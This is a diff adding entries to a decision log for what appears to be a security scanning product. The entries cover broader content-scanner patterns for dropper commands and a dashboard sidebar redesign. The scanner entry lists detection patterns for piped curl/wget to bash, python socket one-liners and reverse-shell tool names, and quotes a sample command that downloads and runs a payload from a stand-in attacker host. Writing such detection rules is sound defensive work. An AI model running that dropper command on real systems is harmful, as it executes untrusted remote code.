@@ -166,3 +166,31 @@ Every significant technical choice, why we made it, and what we said no to.
 **What we rejected:** Qwen 2.5 14B (better quality-per-parameter but Alibaba provenance), DeepSeek (Chinese), Mistral (French — acceptable but American preferred).
 
 **Impact:** Model selection is constrained to Google, NVIDIA, and Meta model families. Currently using Gemma 4 E4B (Google).
+
+---
+
+## Broader Content Scanner Patterns After Path C Trace Analysis
+
+**Date:** 2026-04-08
+
+**What we chose:** Added 4 new content scanner patterns (`curl [flags] | bash`, `wget [flags] | bash`, `curl -o /tmp/`, `python -c 'import socket'`) and 3 signal boost patterns (`curl|bash`, `wget|bash`, `reverse.shell|meterpreter|cobalt.strike`). Content scanner now has 70 patterns, signal boost has 11.
+
+**Why:** A detailed Path C code trace for a supply chain compromise alert revealed that the existing `curl\s+http.*| bash` pattern required `http` immediately after `curl`. Real-world droppers use `curl -s http://...` where the `-s` flag comes first, causing the pattern to miss the attack. The broader pattern `curl\s+[^\n]*\|\s*(?:ba)?sh` catches all flag combinations.
+
+**What we rejected:** Only fixing the narrow pattern (would miss wget variants and python one-liners).
+
+**Impact:** The content scanner now catches `curl -s http://evil.com/payload | bash` and similar dropper patterns that previously slipped through. Regression 16/16 confirmed.
+
+---
+
+## Dashboard Sidebar Navigation (Tab Bar to Grouped Sidebar)
+
+**Date:** 2026-04-07
+
+**What we chose:** Converted the web-admin dashboard (port 3100) from a flat 6-tab horizontal bar to a vertical sidebar with 4 collapsible groups: Operations, Intelligence, Analytics, Admin.
+
+**Why:** The flat tab bar didn't scale as pages were added. The grouped sidebar provides hierarchical organization and room for future pages without cluttering the navigation.
+
+**What we rejected:** Keeping the flat tabs (doesn't scale), mega-menu (over-engineered for 8 pages).
+
+**Impact:** New Sidebar.tsx and AutoTemplates.tsx components added. AdminDashboard.tsx restructured to use sidebar layout. Pipeline Monitor available as a standalone page.
